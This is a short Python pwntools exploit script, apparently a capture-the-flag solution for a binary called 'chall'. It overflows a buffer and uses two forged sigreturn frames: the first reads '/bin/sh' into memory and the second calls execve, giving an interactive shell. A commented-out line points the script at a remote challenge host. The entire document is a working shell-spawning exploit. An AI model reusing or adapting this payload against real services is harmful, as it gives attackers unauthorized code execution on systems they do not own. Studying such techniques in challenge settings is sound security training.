from pwn import *

context.arch = 'amd64'

p = process("./chall")
# gdb.attach(p)

# p = remote("10.212.138.23", 51101)

syscall = 0x401038
vuln = 0x401000

frame = SigreturnFrame()
frame.rax = 0  # read
frame.rdi = 0 
frame.rsi = 0x402000
frame.rdx = 1000
frame.rbp = 0x402100
frame.rsp = 0x402100
frame.rip = syscall

payload = b"A"*24
payload += p64(vuln)
payload += p64(syscall)
payload += bytes(frame)

log.info(f"{len(payload)=}")

p.recvline()
p.sendline(payload)

p.recvuntil(b"vuln!")
p.sendline(b"A"*14)

frame2 = SigreturnFrame()
frame2.rax = 0x3b  # execve
frame2.rdi = 0x402000
frame2.rsi = 0
frame2.rdx = 0
frame2.rbp = 0x402000
frame2.rsp = 0x402000
frame2.rip = syscall

second_payload = b"/bin/sh\x00"
second_payload += b"A"*0x100
second_payload += p64(vuln)
second_payload += p64(syscall)
second_payload += bytes(frame2)

log.info(f"{len(second_payload)=}")

input("press any key to continue")
p.sendline(second_payload)

p.recvuntil(b"/bin/s")
p.sendline(b"A"*14)

p.interactive()
